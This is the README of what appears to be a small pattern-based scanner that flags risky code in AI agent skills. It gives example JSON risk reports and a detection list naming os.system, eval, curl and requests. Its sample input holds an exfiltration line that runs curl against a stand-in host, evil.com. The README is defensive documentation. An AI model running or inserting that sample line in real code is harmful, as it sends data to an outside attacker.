# Before installing any AI skill… scan it first.

# 🛡️ ClawShield Lite

AI-powered security scanner for OpenClaw skills.

## 🚨 Why This Matters
AI skills can execute system commands, access files, and send data externally.

ClawShield Lite helps you detect:
- Dangerous commands (os.system, exec, eval)
- Data exfiltration risks (curl, requests)
- File access patterns

## ⚙️ Features
- Fast static code analysis
- Risk scoring (SAFE / MEDIUM / HIGH)
- Human-readable explanations

## 🧪 Example Output
Example 1: HIGH RISK 🚨
{
  "risk_level": "HIGH RISK 🚨",
  "issues": [
    {
      "pattern": "os.system",
      "severity": "high",
      "explanation": "Executes system-level commands which may compromise the host machine"
    },
    {
      "pattern": "eval(",
      "severity": "high",
      "explanation": "Evaluates arbitrary Python code and can be exploited for code injection"
    },
    {
      "pattern": "curl",
      "severity": "high",
      "explanation": "May send or receive data from external servers, possible data exfiltration risk"
    }
  ]
}

⚠️ Example 2: MEDIUM RISK

{
  "risk_level": "MEDIUM RISK ⚠️",
  "issues": [
    {
      "pattern": "open(",
      "severity": "medium",
      "explanation": "Accesses local files which may expose sensitive data"
    },
    {
      "pattern": "requests",
      "severity": "medium",
      "explanation": "Makes external HTTP requests that could transmit data خارج the system"
    }
  ]
}


✅ Example 3: SAFE

{
  "risk_level": "SAFE ✅",
  "issues": []
}



# ClawShield Lite 🛡️

A lightweight security analysis skill that scans AI skill source code for risky patterns and generates a structured risk report.

## Features

- **Pattern-based scanning** — detects dangerous and suspicious code patterns
- **Risk classification** — assigns `SAFE`, `MEDIUM RISK`, or `HIGH RISK` levels
- **Structured JSON output** — machine-readable reports for easy integration
- **Extensible rules** — add or modify patterns in `rules.json`
- **Zero dependencies** — runs on Python 3 standard library only

## Installation

```bash
git clone https://github.com/<your-username>/clawshield-lite.git
cd clawshield-lite
# No dependencies required — uses stdlib only
```

## Usage

Pipe code directly:

```bash
echo 'import os; os.system("ls")' | python main.py
```

Scan a file:

```bash
cat suspect_skill.py | python main.py
```

## Sample Input

```python
import os
import requests

os.system("curl http://evil.com/steal")
data = eval(user_input)
```

## Sample Output

```json
{
  "risk_level": "HIGH RISK",
  "issues": [
    {
      "pattern": "os.system",
      "severity": "high",
      "explanation": "Executes system-level commands"
    },
    {
      "pattern": "eval(",
      "severity": "high",
      "explanation": "Evaluates dynamic expressions"
    },
    {
      "pattern": "curl",
      "severity": "high",
      "explanation": "Transfers data to external servers"
    },
    {
      "pattern": "requests",
      "severity": "medium",
      "explanation": "Makes external HTTP requests"
    }
  ]
}
```

## Project Structure

```
clawshield-lite/
├── SKILL.md           # Skill metadata & description
├── main.py            # Core scanner logic
├── rules.json         # Pattern rules database
├── README.md          # Documentation
├── requirements.txt   # Python dependencies
└── .gitignore         # Git ignore rules
```

## How Risk Levels Are Assigned

| Condition | Risk Level |
|---|---|
| No issues found | `SAFE` |
| 1–2 issues found | `MEDIUM RISK` |
| 3+ issues **or** 3+ high-severity | `HIGH RISK` |

## Future Improvements

- AST-based analysis for deeper code understanding
- Support for multiple languages (JavaScript, Bash, etc.)
- Configurable severity thresholds
- Integration with CI/CD pipelines
- Line-number reporting for each finding
- SARIF output format for IDE integration

## License

MIT
